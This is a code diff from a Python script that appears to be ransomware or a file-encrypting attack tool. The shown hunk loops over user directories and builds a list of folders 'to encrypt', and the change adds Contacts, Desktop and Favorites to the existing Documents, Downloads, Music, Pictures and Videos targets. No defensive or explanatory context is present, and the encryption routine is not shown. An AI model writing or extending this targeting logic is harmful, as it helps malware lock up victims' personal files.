@@ -157,24 +157,35 @@ if __name__ == '__main__':
     
     for user_dir in users:
     
+        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] User: [{bcolors.OKCYAN}"+user_dir+f"{bcolors.ENDC}]")
+    
         # Generate file paths for this user.
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generating file paths to encrypt...")
+        contactsFolder = os.path.join(user_dir, 'Contacts')
+        desktopFolder = os.path.join(user_dir, 'Desktop')
         documentsFolder = os.path.join(user_dir, 'Documents')
         downloadsFolder = os.path.join(user_dir, 'Downloads')
+        favoritesFolder = os.path.join(user_dir, 'Favorites')
         musicFolder = os.path.join(user_dir, 'Music')
         picturesFolder = os.path.join(user_dir, 'Pictures')
         videosFolder = os.path.join(user_dir, 'Videos')
         
         print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Generated file paths to encrypt:")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+contactsFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+desktopFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+documentsFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+downloadsFolder+f"{bcolors.ENDC}]")
+        print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+favoritesFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+musicFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+picturesFolder+f"{bcolors.ENDC}]")
         print(f" [{bcolors.OKGREEN}>{bcolors.ENDC}] [{bcolors.WARNING}"+videosFolder+f"{bcolors.ENDC}]")
         
         commonDirectories = [
+            contactsFolder,
+            desktopFolder,
             documentsFolder,
             downloadsFolder,
+            favoritesFolder,
             musicFolder,
             picturesFolder,
             videosFolder,
